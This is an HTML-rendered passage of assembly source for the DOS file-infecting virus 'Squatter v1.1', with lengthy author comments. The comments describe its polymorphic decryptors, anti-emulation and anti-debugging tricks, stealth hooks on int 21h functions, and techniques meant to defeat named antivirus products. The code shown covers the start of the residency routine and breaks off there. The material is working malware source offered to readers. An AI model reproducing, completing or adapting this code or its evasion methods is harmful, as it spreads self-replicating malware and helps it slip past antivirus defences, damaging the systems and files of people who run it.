<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Squatter.8019 - SQUAT_11.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">;;;Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ</span><span class="sc0">
</span><span class="sc1">;;; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">;;; ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥∆œœœœœœœœœœœœœœœœœœœœœœœœœœœœµ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥</span><span class="sc0">
</span><span class="sc1">;;; ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥  S Q U A T T E R  v 1 . 1  ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥</span><span class="sc0">
</span><span class="sc1">;;; ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥     c o d e d      b y     ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥</span><span class="sc0">
</span><span class="sc1">;;; ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥  -= The Mental Driller =-  ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥</span><span class="sc0">
</span><span class="sc1">;;; ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥∆————————————————————————————µ≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥≥</span><span class="sc0">
</span><span class="sc1">;;; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">;;;Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ</span><span class="sc0">
</span><span class="sc1">;;; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;; ENHANCED SQUATTER v1.0</span><span class="sc0">
</span><span class="sc1">;;;; BUGS FIXED, ANTI-EMULATING TRICKS INMPLEMENTED, POLYMORPHISM IMPROVED</span><span class="sc0">

</span><span class="sc1">;;; Since I'm spanish, my english could suck anytime, so be benevolent with</span><span class="sc0">
</span><span class="sc1">;; me :) . All labels in the virus are in spanish, and some labels hasn't a</span><span class="sc0">
</span><span class="sc1">;; normal name, because are "transition" labels. Only the important labels have</span><span class="sc0">
</span><span class="sc1">;; a name like "@@DesinfectaHandle" ("@@DisinfectHandle" in english), for exam-</span><span class="sc0">
</span><span class="sc1">;; ple.</span><span class="sc0">

</span><span class="sc1">;;; This virus started like SQUATTER v1.0. AVP, DSAV, and all that avs can</span><span class="sc0">
</span><span class="sc1">;; detect it now. Then I modified the source a little bit, without modifying</span><span class="sc0">
</span><span class="sc1">;; the polymorphism engine, and I looked that DSAV (Dr. Solomon's Anti-Virus)</span><span class="sc0">
</span><span class="sc1">;; could detect it like "...could be a new virus!". Damn! This av has a really</span><span class="sc0">
</span><span class="sc1">;; good emulation technique.</span><span class="sc0">
</span><span class="sc1">;; Then, I said: "Virus always go a step over anti-virus. I MUST do a virus</span><span class="sc0">
</span><span class="sc1">;; that forces anti-virus to be reprogrammed". That's it! After coding and re-</span><span class="sc0">
</span><span class="sc1">;; coding certain parts of the virus and the polymorphism engine I reached what</span><span class="sc0">
</span><span class="sc1">;; I wanted. There are forms of the virus that they aren't recognized like exe-</span><span class="sc0">
</span><span class="sc1">;; cutable code by the antivirus :) , but you can "safelly" run them ("safelly"</span><span class="sc0">
</span><span class="sc1">;; with quotes because it's a virus, you know :) .</span><span class="sc0">

</span><span class="sc1">;;; WARNINGS!</span><span class="sc0">
</span><span class="sc1">;;; All accesses to memory and offsets contains a subtract like</span><span class="sc0">
</span><span class="sc1">;;;       MOV     [AntInt21h-200h], BX</span><span class="sc0">
</span><span class="sc1">;;; This "-200h" is because I used an emulation of an infected COM program to</span><span class="sc0">
</span><span class="sc1">;;; run the virus, and all addresses are related to 200h, which is the initial</span><span class="sc0">
</span><span class="sc1">;;; delta-offset. So I must subtract this quantity every time. I know it sucks,</span><span class="sc0">
</span><span class="sc1">;;; but I was too lazy to change it &amp;)</span><span class="sc0">
</span><span class="sc1">;;; It has anti-heuristics, so, when I call to int 21h, I subtract 10h from the</span><span class="sc0">
</span><span class="sc1">;;; function number, and this quantity is added on "Int21h" routine (this rou-</span><span class="sc0">
</span><span class="sc1">;;; tine calls real int 21h). For example, when I use "MOV AX,2D02/CALL Int21h"</span><span class="sc0">
</span><span class="sc1">;;; I'm calling to function 3D02h of the int 21h.</span><span class="sc0">

</span><span class="sc1">;;; Well, let's go with explanations about this virus and what it does:</span><span class="sc0">

</span><span class="sc1">;** FEATURES **</span><span class="sc0">

</span><span class="sc1">;;; Now the created decryptor can't be debugged and/or emulated properly if</span><span class="sc0">
</span><span class="sc1">;; it isn't runned normally. Of course, since the virus is polymorphic, there</span><span class="sc0">
</span><span class="sc1">;; are situations when the decryptor could be traced with a debugger/emulator.</span><span class="sc0">

</span><span class="sc1">;;; SQUATTER v1.0 had bugs on installation that made that virus a bit unstable</span><span class="sc0">
</span><span class="sc1">;; in some systems. Now these bugs are fixed, and a new residency routine has</span><span class="sc0">
</span><span class="sc1">;; been stablished. Now it handles correctly UMBs and MCBs.</span><span class="sc0">

</span><span class="sc1">;;; The virus catch 24 functions of the int 21h. 16 are used for the stealth</span><span class="sc0">
</span><span class="sc1">;; (they were 17, but handling function 40h the virus doesn't work properly,</span><span class="sc0">
</span><span class="sc1">;; so it has been disabled), 6 for infecting and 2 miscellaneous (function 1Ah</span><span class="sc0">
</span><span class="sc1">;; to go faster on DIR stealth and function 30h like install check).</span><span class="sc0">

</span><span class="sc1">;;; FCB dis/infection is now implemented. I realized that DOS uses FCB to de-</span><span class="sc0">
</span><span class="sc1">;; lete files. If you delete any infected file and you recover it with "UNDE-</span><span class="sc0">
</span><span class="sc1">;; LETE" or similars, the non-stealthed size of the archive is shown. Then I</span><span class="sc0">
</span><span class="sc1">;; had to code a routine for disinfecting FCB on deleting files. Since disin-</span><span class="sc0">
</span><span class="sc1">;; fection on deletion is the same than disinfection on opening, I supported</span><span class="sc0">
</span><span class="sc1">;; FCB disinfection on opening too. In the same way, infection on FCB closing</span><span class="sc0">
</span><span class="sc1">;; is supported.</span><span class="sc0">

</span><span class="sc1">;; During the installation the virus does:</span><span class="sc0">
</span><span class="sc1">;; * It checks the DOS version. If the virus isn't resident, it would be exe-</span><span class="sc0">
</span><span class="sc1">;;  cuted normally. If it is resident, when it returns from the interruption</span><span class="sc0">
</span><span class="sc1">;;  all the residency process will be avoided, returning directly to the label</span><span class="sc0">
</span><span class="sc1">;;  "@@FinInstalacion". Before doing it, the virus in memory will check all the</span><span class="sc0">
</span><span class="sc1">;;  code that follows to the return pointer, and if it is the virus, the quan-</span><span class="sc0">
</span><span class="sc1">;;  tity of bytes necessary to go to the end of the installation will be added</span><span class="sc0">
</span><span class="sc1">;;  to the return pointer. It is made to avoid certain lamer antivirus which</span><span class="sc0">
</span><span class="sc1">;;  checks memory for virus calling the install-check functions.</span><span class="sc0">
</span><span class="sc1">;; * It searchs the last UMB in memory (which normally is the DOS UMB of free</span><span class="sc0">
</span><span class="sc1">;;  upper memory) and subtract the quantity of memory the virus needs (if it</span><span class="sc0">
</span><span class="sc1">;;  is big enough, of course). If the UMB isn't big enough or the system can't</span><span class="sc0">
</span><span class="sc1">;;  hold UMBs for any reason, the virus will install via MCBs.</span><span class="sc0">
</span><span class="sc1">;; * The int 21h will be traced with the int 30h trick. If it fails, int 21h</span><span class="sc0">
</span><span class="sc1">;;  will be traced with single-step tracing.</span><span class="sc0">
</span><span class="sc1">;; * It will patch the pointers in memory to the real int 21h, to avoid writing</span><span class="sc0">
</span><span class="sc1">;;  on the TVI and/or avoid patching the first 5 bytes with a JMP XXXX:XXXX,</span><span class="sc0">
</span><span class="sc1">;;  because the dis/infection system of the virus can't hold the last method</span><span class="sc0">
</span><span class="sc1">;;  (to patch with a JMP).</span><span class="sc0">
</span><span class="sc1">;; * It recovers the original values of execution in the registers when it exe-</span><span class="sc0">
</span><span class="sc1">;;  cutes the host (a little work to improve the stealth).</span><span class="sc0">

</span><span class="sc1">;; Using int 21h, the virus is practically invisible to the system. Moreover,</span><span class="sc0">
</span><span class="sc1">;; it's a fast-infector.</span><span class="sc0">
</span><span class="sc1">;;  Infection functions:</span><span class="sc0">
</span><span class="sc1">;;   * 3Eh  - Close handle</span><span class="sc0">
</span><span class="sc1">;;   * 10h  - Close FCB</span><span class="sc0">
</span><span class="sc1">;;   * 4Ch, 00h - Terminate execution (int 20h calls to AH=00/INT 21h internal-</span><span class="sc0">
</span><span class="sc1">;;         ly).</span><span class="sc0">
</span><span class="sc1">;;   * 31h  - TSR</span><span class="sc0">
</span><span class="sc1">;;   * 43h  - Get/set attributes.</span><span class="sc0">
</span><span class="sc1">;;  Stealth functions:</span><span class="sc0">
</span><span class="sc1">;;   * 11h, 12h - Search for directory entries (FCB)</span><span class="sc0">
</span><span class="sc1">;;   * 4Eh, 4Fh - Search for directory entries (Handle)</span><span class="sc0">
</span><span class="sc1">;;   * 23h  - Get file size (FCB)</span><span class="sc0">
</span><span class="sc1">;;   * 3Dh, 6Ch - Open file (Handle)</span><span class="sc0">
</span><span class="sc1">;;   * 0Fh  - Open file (FCB)</span><span class="sc0">
</span><span class="sc1">;;   * 3Fh  - Read from handle</span><span class="sc0">
</span><span class="sc1">;;   * 40h  - Write on handle (set off by problems)</span><span class="sc0">
</span><span class="sc1">;;   * 41h  - Delete file (Handle)</span><span class="sc0">
</span><span class="sc1">;;   * 13h  - Delete file (FCB)</span><span class="sc0">
</span><span class="sc1">;;   * 42h  - Handle pointer seek</span><span class="sc0">
</span><span class="sc1">;;   * 4Bh  - Program execution</span><span class="sc0">
</span><span class="sc1">;;   * 57h  - Get/set time and date from/to a handle</span><span class="sc0">
</span><span class="sc1">;;   * 25h  - Set interrupt vector</span><span class="sc0">
</span><span class="sc1">;;   * 35h  - Get interrupt vector</span><span class="sc0">
</span><span class="sc1">;;  Internal functions:</span><span class="sc0">
</span><span class="sc1">;;   * 30h  - Install-check (anti-lamers)</span><span class="sc0">
</span><span class="sc1">;;   * 1Ah  - Set new DTA address</span><span class="sc0">

</span><span class="sc1">;;; POLYMORPHISM</span><span class="sc0">

</span><span class="sc1">;; I've tried to do an "as-powerful-as-I-can" engine, but you know, our sons</span><span class="sc0">
</span><span class="sc1">;; and daughters are always the most handsome, the most clever... :) . So, I</span><span class="sc0">
</span><span class="sc1">;; can't be objective at all when I say that the engine is one of the good</span><span class="sc0">
</span><span class="sc1">;; ones (I think). The created decryptor contains CALLs, un/conditional JMPs</span><span class="sc0">
</span><span class="sc1">;; with non-zero displacement, conditional JMPs to invalid code, anti-emulating</span><span class="sc0">
</span><span class="sc1">;; and anti-debugging code, indexed memory writes and LOTS of weird 8/16/32 bit</span><span class="sc0">
</span><span class="sc1">;; garbage. The virus is also non-static sized(!), but the stealth works fine</span><span class="sc0">
</span><span class="sc1">;; :) . It would be sufficient with only a decryptor, but I wanted to fuck</span><span class="sc0">
</span><span class="sc1">;; avers, so I put 2! :). However, I did the sufficient stuff to make AVers to</span><span class="sc0">
</span><span class="sc1">;; recode their emulation programs if they want to detect this virus properly.</span><span class="sc0">

</span><span class="sc1">;;; Well, I think it's all. If you look at the code, you will see many things</span><span class="sc0">
</span><span class="sc1">;; that I hadn't say here, but they are interesting.</span><span class="sc0">

</span><span class="sc1">;;;; THANKS TO:</span><span class="sc0">

</span><span class="sc1">;;; 29A : For being the best virus group I've ever seen, and for publishing</span><span class="sc0">
</span><span class="sc1">;;;   this virus in the 29A Magazine. Thanks to bring us such amount of</span><span class="sc0">
</span><span class="sc1">;;;   virus aknowledge, too.</span><span class="sc0">
</span><span class="sc1">;;; VLAD : For the great idea of using the system handles to manage the opera-</span><span class="sc0">
</span><span class="sc1">;;;    tions of dis/infection (look the "FakeHandle" routine to know what</span><span class="sc0">
</span><span class="sc1">;;;    I'm saying). Of course, they keep on being a legend!</span><span class="sc0">
</span><span class="sc1">;;; PS: I don't know if you'll read this, but this group was the one that in-</span><span class="sc0">
</span><span class="sc1">;;; troduced me in the viruscene, specialy Dark Angel. Greetz!.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; Well, eeemh... oh, YES! Thanks to you, for reading this.</span><span class="sc0">

</span><span class="sc1">;;; Now, enjoy :)</span><span class="sc0">

</span><span class="sc1">;;                       The Mental Driller</span><span class="sc0">
</span><span class="sc1">;;                     ÆThe limit of virus making exists only</span><span class="sc0">
</span><span class="sc1">;;                    in the mind of antivirus makersØ</span><span class="sc0">

</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">   </span><span class="sc1">; Not tiny at all! :) (the virus' size is more than 8 Kb!)</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0"> </span><span class="sc5">@@</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">          </span><span class="sc1">; Sorry 286ers, but you are obsolete :)</span><span class="sc0">
</span><span class="sc9">.CODE</span><span class="sc0">      </span><span class="sc1">; Let's start!</span><span class="sc0">

</span><span class="sc1">;;; EQUATES</span><span class="sc0">
</span><span class="sc1">;; "Longvirus" is the clean virus size.</span><span class="sc0">
</span><span class="sc1">;; "LongVirusP" is the amount of memory that the virus needs.</span><span class="sc0">
</span><span class="sc1">;; "LongVirus2" is the static size of the virus (without random increasement)</span><span class="sc0">
</span><span class="sc1">;; "LongCheck" is the amount of bytes that the install-check routine must avoid</span><span class="sc0">
</span><span class="sc1">;;  when returns, to jump directly to the end of the installation process.</span><span class="sc0">
</span><span class="sc1">;; "Palabro" is to save bytes, to put one 32 bits instruction instead of two 16</span><span class="sc0">
</span><span class="sc1">;;  bits instructions.</span><span class="sc0">

</span><span class="sc5">LongVirus</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">FinVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicioVirus</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">LongVirusP</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">LongVirus</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc0">
</span><span class="sc5">LongVirus2</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">400</span><span class="sc0">
</span><span class="sc5">LongCheck</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">FinChequeo</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicioChequeo</span><span class="sc0">
</span><span class="sc5">Palabro</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">LongVirusP</span><span class="sc4">*</span><span class="sc2">10000h</span><span class="sc4">)+</span><span class="sc2">0008h</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">        </span><span class="sc1">; A COM file will be created.</span><span class="sc0">

</span><span class="sc5">Squatter</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Inicio</span><span class="sc0">         </span><span class="sc1">; This code emulates an infected file</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FBh</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">InicioVirus</span><span class="sc0"> </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">
</span><span class="sc5">@@Inicio</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">       </span><span class="sc1">; Delta-offset in SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">         </span><span class="sc1">; Anti-debbuging</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">Truco1</span><span class="sc0">      </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">           </span><span class="sc1">; Another anti-debugging. If this jmp is</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@CopiaVirus</span><span class="sc0">  </span><span class="sc1">; patched, the next code doesn't work</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">         </span><span class="sc1">; DS,ES =&gt; STACK</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">; Get DOS version / install-check</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">InicioChequeo</span><span class="sc0">   </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">        </span><span class="sc1">; DOS &lt; 5.0 ?</span><span class="sc0">
</span><span class="sc5">Truco2</span><span class="sc0">      </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">       </span><span class="sc1">; Anti-debugging (weird!) :)</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@FinInstalacion</span><span class="sc0"> </span><span class="sc1">; If &lt; 5.0, ends</span><span class="sc0">

</span><span class="sc1">;; OK, this is the UMB installation routine. It uses the technic of MCBs, but</span><span class="sc0">
</span><span class="sc1">;; applied to UMBs. To do that, you must know that the last UMB always belong</span><span class="sc0">
</span><span class="sc1">;; to DOS, and this UMB is the free upper memory, so, if you steal some memory</span><span class="sc0">
</span><span class="sc1">;; from this UMB, you don't overwrite any resident program.</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; DI = 0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc0">        </span><span class="sc1">; Get list of lists</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get buffers area address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Segment of the first UMB in AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">     </span><span class="sc1">; Are there UMBs?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PorMCBs1</span><span class="sc0">       </span><span class="sc1">; If not, use traditional methods</span><span class="sc0">
</span><span class="sc5">@@SiguienteUMB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; DS = segment of the first UMB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; Is it the last UMB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PruebaInst</span><span class="sc0">     </span><span class="sc1">; If it is, end searching</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; BX = Size of this UMB</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Add MCB size</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Get in AX the segment of the next UMB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SiguienteUMB</span><span class="sc0">   </span><span class="sc1">; Repeat</span><span class="sc0">
</span><span class="sc5">@@PruebaInst</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirusP</span><span class="sc0"> </span><span class="sc1">; Is the UMB large enough?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@PorMCBs1</span><span class="sc0">       </span><span class="sc1">; If not, go to the traditional method</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get last segment occupied by the UMB</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirusP</span><span class="sc0"> </span><span class="sc1">; Subtract virus size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Put this segment in ES</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirusP</span><span class="sc0"> </span><span class="sc1">; Subtract virus size to</span><span class="sc0">
                             </span><span class="sc1">; UMB's MCB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@CopiaVirus</span><span class="sc0">     </span><span class="sc1">; Jump to copy routine</span><span class="sc0">

</span><span class="sc1">;; This is the "traditional" method of MCBs. It's used when the routine above</span><span class="sc0">
</span><span class="sc1">;; fails</span><span class="sc0">

</span><span class="sc5">@@PorMCBs1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Anti-debugging</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">         </span><span class="sc1">; Recover DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">         </span><span class="sc1">; Get segment of MCB in ES</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
